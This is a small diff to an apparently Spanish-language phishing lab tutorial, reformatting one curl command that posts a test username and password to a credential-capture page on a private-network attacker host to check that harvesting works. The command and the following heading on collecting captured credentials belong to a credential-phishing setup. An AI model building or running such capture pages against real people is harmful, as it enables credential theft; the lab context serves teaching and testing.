@@ -370,8 +370,7 @@ curl http://192.168.57.10:8080
 El atacante puede simular el envío de credenciales desde una supuesta víctima para verificar que la captura funciona:
 
 ```bash
-curl -X POST http://192.168.57.10:8080/capture.php \
-  -d "username=admin&password=Password123!"
+curl -X POST http://192.168.57.10:8080/capture.php -d 'username=admin&password=Password123!'
 ```
 
 #### Recolección de credenciales capturadas
